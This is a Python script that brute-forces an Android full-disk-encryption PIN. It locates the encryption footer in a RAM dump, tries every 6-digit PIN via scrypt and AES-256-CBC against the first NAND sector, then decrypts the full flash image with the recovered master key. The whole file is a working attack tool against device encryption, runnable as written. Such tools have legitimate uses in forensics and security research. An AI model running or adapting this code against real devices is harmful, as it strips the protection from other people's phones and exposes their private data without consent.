import re
from M2Crypto import EVP
import scrypt
import hashlib
import struct
import os
import sys
import itertools

mainmemory_dir = sys.argv[1]
nandmemory_dir = sys.argv[2]
outfile_dir = sys.argv[3]

mainmemory = open(mainmemory_dir, 'rb')
nandmemory = open(nandmemory_dir, 'rb')
outfile = open(outfile_dir, 'wb')

find_sig = re.search('\xC4\xB1\xB5\xD0', mainmemory.read()) # Find FDE Signature
sig_offset = find_sig.start()
mainmemory.seek(sig_offset)
fde_data = mainmemory.read(0xD0)
data = struct.unpack('<IHHIIIIQI64sI64s16sQQIBBBB', fde_data)

print '[*] Get data from MainMemory'

encrypted_key = data[11][:data[5]] # print '[*] master_key : ' + data[11][:data[5]].encode('hex')  # 64s
salt = data[12] # print '[*] salt : ' + data[12].encode('hex')  # 16s
encrypted_data = nandmemory.read(512) # Cut 512byte because Nand data is too large

print '[*] Start Brute-Forcing Attack'

for i in itertools.product(xrange(10), repeat=6):
	pin = ''.join(str(pins) for pins in i)

	derived = scrypt.hash(pin, salt, 32768, 8, 2)
	key = derived[:32]
	iv = derived[32:48]

	cipher = EVP.Cipher(alg='aes_256_cbc', key=key, iv=iv, padding=0, op=0)
	master_key = cipher.update(encrypted_key)

	sector_number = struct.pack('<I', 0) + '\x00' * 12 # Sector is 0 because decrypt only first 512byte 
	master_key_salt = hashlib.sha256(master_key).digest()

	cipher = EVP.Cipher(alg='aes_256_cbc', key=master_key_salt, iv='', padding=0, op=1)
	essiv = cipher.update(sector_number)

	cipher = EVP.Cipher(alg='aes_256_cbc', key=master_key, iv=essiv, padding=0, op=0)
	decrypted_data = cipher.update(encrypted_data)

	try: 
		if int(pin) % 10000 == 0:
			print '[*] Brute-Force PIN %d to %d' % (int(pin), int(pin) + 10000)
	except:
		pass

	if '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' in decrypted_data:
		print '[*] Found PIN !!'
		print '[*] PIN : ' + str(pin)
		print '[*] Master Key : ' + master_key.encode('hex')
		print '[*] Decrypted Data :\n' + decrypted_data.encode('hex')
		break

sector_start = 0
sector_size = 512
fileSize = os.path.getsize(nandmemory_dir)
sectors = fileSize / sector_size
print '[*] Sectors : ' + str(sectors)
print '[*] Start Decrypting'

for i in range(sectors):
	sector_offset = sector_start + i
	encrypted_data = nandmemory.read(sector_size)
	sector_number = struct.pack("<I", sector_offset) + "\x00" * 12

	cipher = EVP.Cipher(alg='aes_256_cbc', key=master_key_salt, iv='', padding=0, op=1)
	essiv = cipher.update(sector_number)

	cipher = EVP.Cipher(alg='aes_256_cbc', key=master_key, iv=essiv, padding=0, op=0)
	decrypted_data = cipher.update(encrypted_data)

	outfile.write(decrypted_data)
	try: 
		if int(sector_offset) % 100000 == 0:
			print '[*] Decrypting Sector %d to %d' % (int(sector_offset), int(sector_offset) + 100000)
	except:
		pass

print '[*] Done!~'
nandmemory.close()
outfile.close()